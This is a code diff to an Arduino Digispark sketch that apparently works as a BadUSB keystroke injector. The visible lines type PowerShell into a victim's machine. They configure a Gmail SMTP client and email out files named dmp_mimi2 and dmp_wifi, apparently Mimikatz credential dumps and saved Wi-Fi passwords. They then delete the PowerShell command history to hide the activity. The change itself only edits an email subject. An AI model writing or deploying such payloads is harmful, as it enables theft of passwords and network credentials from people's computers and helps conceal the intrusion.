@@ -49,7 +49,7 @@ void loop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.println(F("$SMTPServer = 'smtp.gmail.com'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<email>', '<password>'); $ReportEmail = New-Object System.Net.Mail.MailMessage"));
   DigiKeyboard.delay(3000);
-  DigiKeyboard.println(F("$ReportEmail.From = '<email>'; $ReportEmail.To.Add('<email>'); $ReportEmail.Subject = 'new minidump'; $ReportEmail.Body = Get-Content dmp_mimi2; $SMTPInfo.Send($ReportEmail);"));
+  DigiKeyboard.println(F("$ReportEmail.From = '<email>'; $ReportEmail.To.Add('<email>'); $ReportEmail.Subject = 'new mimidump'; $ReportEmail.Body = Get-Content dmp_mimi2; $SMTPInfo.Send($ReportEmail);"));
   DigiKeyboard.delay(3000);
   DigiKeyboard.println(F("$ReportEmail.From = '<email>'; $ReportEmail.To.Add('<email>'); $ReportEmail.Subject = 'new wifidump'; $ReportEmail.Body = Get-Content dmp_wifi; $SMTPInfo.Send($ReportEmail); Remove-Item (Get-PSReadlineOption).HistorySavePath;"));
   DigiKeyboard.delay(3000);
